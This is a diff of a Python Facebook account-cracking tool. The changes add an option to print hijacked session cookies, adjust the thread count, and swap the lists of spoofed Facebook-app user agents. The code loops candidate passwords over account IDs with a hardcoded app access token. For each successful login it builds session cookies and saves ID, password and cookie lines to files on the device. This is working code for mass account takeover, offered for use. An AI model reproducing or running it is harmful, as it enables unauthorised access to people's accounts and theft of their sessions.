@@ -254,10 +254,10 @@ def getKey():
     bumper = bxd+id+xp
     return bumper
 def ua():
-	END = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
-	ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe) [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+	END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
+	ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
 	return ua        
-	ua = 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+	ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CHP7800 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
 	return ua
 def iAmMethod2Ua():
     END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.07.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.07.0.1 CHP7800 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
@@ -357,7 +357,7 @@ def file():
                                 clear()
                                 print(' All method working try 1 by 1 ')
                                 linex()
-                                print(' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4 \n [5] Method 5')
+                                print(' [1] Method 1(RECOMMENDED)\n [2] Method 2 \n [3] Method 3 \n [4] Method 4 \n [5] Method 5')
                                 linex()
                                 mthd=input(' Choose: ')
                                 linex()
@@ -412,14 +412,23 @@ def file():
                                         for i in range(ps_limit):
                                                 plist.append(input(f' Password {i+1}: '))
                                 linex()
-                                print(' Do you went show cp account? (y/n): ')
+                                print(' Do you want show cp account? (y/n): ')
                                 linex()
                                 cx=input(' Choose: ')
                                 if cx in ['y','Y','yes','Yes','1']:
                                         pcp.append('y')
                                 else:
                                     pcp.append('n')
-                                with tred(max_workers=30) as crack_submit:
+                                linex()
+                                print(' Do you want show cookies? (y/n): ')
+                                linex()
+                                print('\033[1;37m----------------------------------------------')
+                                DI=input(' Choose: ')
+                                if cx in ['y','Y','yes','Yes','1']:
+                                        pcookie.append('y')
+                                else:
+                                    pcookie.append('n')
+                                with tred(max_workers=15) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
                                         print('\033[1;37m \x1b[38;5;208mTOTAL ACCOUNT : \033[1;32m'+total_ids)
@@ -721,6 +730,10 @@ def M1(ids,names,passlist):
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                         print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        if 'y' in pcookie:
+                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        else:
+                                        	continue
                                         open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
@@ -818,7 +831,11 @@ def M2(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [print("\033[1;32m NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        if 'y' in pcookie:
+                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        else:
+                                        	continue
                                         open('/sdcard/NEWTON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
@@ -916,9 +933,12 @@ def M3(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
-                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
+                                        print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                         print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
-                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        if 'y' in pcookie:
+                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        else:
+                                        	continue
                                         open('/sdcard/NEWTON_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
@@ -949,7 +969,7 @@ def M3(ids,names,passlist):
 def rndm1(ids,passlist):
         global loop
         global oks,cps
-        sys.stdout.write('\r\r\033[1;32m [ALONE-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;32m [NEWTON-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
